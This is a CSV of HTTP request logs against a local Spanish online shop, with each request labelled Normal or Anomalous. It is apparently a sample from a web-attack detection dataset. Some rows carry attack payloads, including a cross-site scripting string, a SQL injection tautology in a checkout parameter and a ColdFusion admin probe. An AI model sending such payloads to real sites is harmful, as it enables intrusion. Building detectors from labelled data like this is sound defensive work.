raw_log,classification
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=abdel-az&password=berberisco&nombre=Zaqueo&apellidos=Cabada+Ferrus&email=gentry.gast%40luchalibremexicana.cat&dni=43141809L&direccion=General+Bravo%2C+189%2C+&ciudad=Collado+Mediano&cp=31281&provincia=Salamanca&ntc=2840005774765443&B1=Registrar,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito%4040,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modoA=entrar&login=vivianne7&pwd=adu3%F3n&remember=on&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=ning&password=Graciosamente&nombre=Roc%EDo+Libertad&apellidos=Oviol+De+la+Quintana&email=tchoukova%40sgi-sl.is&dni=16822336K&direccion=Urbanizacion+Palmeras%2C+S%2FN%2C+&ciudad=Oropesa&cp=17723&provincia=Segovia&ntc=1507392936285379&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&loginA=krowlek&pwd=veintidoseno&remember=off&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=damiano&password=EsCoGiDAMeNte&nombre=Vilmar&apellidos=Mateu+Bernaus&email=sheybal%40cirugiaparpado.no&dni=75586196P&direccion=Travesia+Nardo+124%2C+7E&ciudad=Torre+de%2F+Mi*guel+Sesmer%2Bo&cp=42311&provincia=C%E1ceres&ntc=6955835443751937&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=900&B1=Pasar+por+caja%27OR%27a%3D%27a HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chuanhsi&pwd=b129a97r&remember=on&B1=Entrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%2B,Anomalous
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=hyatt&password=8c75ps8s&nombre=Raimundo&apellidos=Trave+Girard&email=graef%40softwaremasservicio.is&dni=70803791Q&direccion=Carrer+N%BA++224+S%2FN%2C+3C&ciudad=Cervera+del+Maestre&cp=09390&provincia=Ciudad+Real&ntc=0093197595343977&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=mullinix&password=portadguero&nombre=Nanda&apellidos=Santagata+Pillajo&email=wakasa%40miami-beach.gf&dni=44636251J&direccion=C%2F+Perro+De+San+Cecilio%2C+197+11%3FA&ciudad=Cerro+de+And%E9valo%2C+El&cp=19275&provincia=Guadalaja%2Fra&ntc=5604259372572557&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/CFIDE/administrator/login.cfm HTTP/1.1,Anomalous
